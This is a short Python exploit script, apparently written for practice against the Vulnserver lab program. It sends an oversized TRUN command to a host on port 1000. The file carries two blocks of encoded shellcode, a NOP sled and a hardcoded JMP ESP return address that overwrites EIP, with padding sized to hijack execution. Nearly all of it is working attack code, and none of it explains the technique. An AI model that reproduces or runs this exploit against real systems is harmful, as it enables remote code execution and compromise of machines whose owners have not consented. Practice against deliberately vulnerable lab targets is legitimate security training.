#!/usr/bin/python 

import socket
import os
import sys 

host="192.168.0.128"
port=1000


#badchars \x00\x0a\x0d
'''
shellcode=("\xbf\x74\x44\x10\xcf\xdb\xcf\xd9\x74\x24\xf4\x5a\x2b"
"\xc9\xb1\x31\x31\x7a\x13\x03\x7a\x13\x83\xc2\x70\xa6"
"\xe5\x33\x90\xa4\x06\xcc\x60\xc9\x8f\x29\x51\xc9\xf4"
"\x3a\xc1\xf9\x7f\x6e\xed\x72\x2d\x9b\x66\xf6\xfa\xac"
"\xcf\xbd\xdc\x83\xd0\xee\x1d\x85\x52\xed\x71\x65\x6b"
"\x3e\x84\x64\xac\x23\x65\x34\x65\x2f\xd8\xa9\x02\x65"
"\xe1\x42\x58\x6b\x61\xb6\x28\x8a\x40\x69\x23\xd5\x42"
"\x8b\xe0\x6d\xcb\x93\xe5\x48\x85\x28\xdd\x27\x14\xf9"
"\x2c\xc7\xbb\xc4\x81\x3a\xc5\x01\x25\xa5\xb0\x7b\x56"
"\x58\xc3\xbf\x25\x86\x46\x24\x8d\x4d\xf0\x80\x2c\x81"
"\x67\x42\x22\x6e\xe3\x0c\x26\x71\x20\x27\x52\xfa\xc7"
"\xe8\xd3\xb8\xe3\x2c\xb8\x1b\x8d\x75\x64\xcd\xb2\x66"
"\xc7\xb2\x16\xec\xe5\xa7\x2a\xaf\x63\x39\xb8\xd5\xc1"
"\x39\xc2\xd5\x75\x52\xf3\x5e\x1a\x25\x0c\xb5\x5f\xd9"
"\x46\x94\xc9\x72\x0f\x4c\x48\x1f\xb0\xba\x8e\x26\x33"
"\x4f\x6e\xdd\x2b\x3a\x6b\x99\xeb\xd6\x01\xb2\x99\xd8"
"\xb6\xb3\x8b\xba\x59\x20\x57\x13\xfc\xc0\xf2\x6b")
'''
shellcode=("\xbd\xca\x33\xe4\x6b\xda\xd9\xd9\x74\x24\xf4\x5f\x31"
"\xc9\xb1\x68\x83\xc7\x04\x31\x6f\x10\x03\x6f\x10\x28"
 "\xc6\x3f\xac\x14\x3e\xf1\xd3\xde\x98\x85\x37\xea\x40"
 "\x4d\xf1\xa3\x16\xa0\x42\xd9\xdb\x81\x5e\x5e\x18\x01"
 "\xbd\x82\x75\x38\x22\x3a\xa3\x7a\x88\x94\x4f\x7b\xde"
 "\x9c\x7b\xb2\xfe\x8f\x9f\x30\x55\x4f\x11\xb1\x0f\x05"
 "\xc9\x8c\x58\x04\xec\x12\xb4\x28\xc5\xaa\x6a\xff\xba"
 "\x1e\x0c\xd6\x8f\x52\xb2\x50\x8d\xbd\xae\x72\xe0\xd6"
 "\xe2\x36\x62\x59\x33\xc2\xae\xaf\xce\x74\x73\x0e\x02"
 "\x47\x2d\x90\xa1\xa6\xed\x8b\x50\x12\x90\x89\xf8\x9d"
 "\x2a\xd2\xa5\x58\x69\x1c\x35\xe1\x7d\xd7\x57\x5c\x09"
 "\x47\xde\xe4\xff\xd8\x65\xa9\x07\x7d\x60\xd2\x0f\x08"
 "\x99\x03\x5a\x54\x19\xc2\xbd\xb8\xda\x4d\x04\xc2\x9b"
 "\x55\xe9\x1e\x8f\x98\x1d\x06\x75\x17\x73\x65\x32\xef"
"\x3a\xf3\x39\xba\x5d\x42\x36\xed\xca\xe6\xea\x35\x17"
 "\x55\x3d\x9e\x3b\x56\x86\x6d\x8f\xa2\xaa\xc3\xe9\x22"
"\x5e\xd2\xcb\x49\x84\x2c\x81\xad\x39\x07\x1d\x1a\xa6"
"\xf9\x94\x01\x02\xed\xcc\xa7\x1f\x21\xda\x8f\x03\xbf"
 "\xec\xa3\xf2\x4e\x2e\x0f\x85\x79\x0f\x37\x1a\xf9\xb7"
 "\x6f\x3a\x15\x54\xb1\x83\x7c\x2c\xd2\xb5\x1f\xda\xdf"
"\xa2\xc2\x3f\x02\x1b\x58\x0e\x2a\x80\xc2\x21\xe2\x49"
 "\x6a\x20\x6c\x5f\x25\x21\x01\xfc\xd8\x3d\x84\xef\x6b"
 "\x55\x78\xca\x21\x4d\xa4\x19\xdd\x24\xd9\xa8\x68\x5a"
 "\x52\x9f\xc9\xf0\x9d\xd2\x59\xca\xdc\x40\xe1\x82\x45"
 "\xa3\x48\x55\x87\x7e\xfe\xc0\x37\x51\xa7\x19\xac\x2d"
 "\x89\xa3\x21\xf4\x36\xbc\x04\xa0\x68\xb5\x69\xe8\xb9"
 "\x73\x27\x21\xb5\x67\xf2\x80\xdf\x86\xcf\x2c\x8e\xe7"
 "\x04\xa4\x1d\x8d\x12\x78\xc5\x0f\x55\x04\xc3\xf8\x0b"
 "\xb6\xe2\xcd\xb5\x04\xd8\xd0\x60\x38\xf9\x4b\x41\x55"
 "\x9e\x81\xba\xc3\x3a\x01\x6d\x65\x01\xc2\xdd\x2a\xef"
 "\x39\x46\x87\x70\xb5\x15\x39\x1c\x23\xe8\x9d\x14\x50"
"\x82\xa0\x6a\xb5\x25\x80\x32\xe7\x4a\xfc\x1d\x50\x26"
 "\x9f\x64\xde\x22\x22\x15\xad\x39\xf8\xb3\x0e\xe4\x4a"
"\x7e\x96\x68\xb9\x83\xce\xdc\xcc\xaf\x4d\xe0\xcc")

payload="\x90"*20 + shellcode

EIP="\xAF\x11\x50\x62" #jmp esp - esp holds pointer to shellcode

buf= "TRUN /.:/" + "A"*2003 + EIP + payload + "D"*(5050-2003-4-len(payload))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(buf)
sock.close()
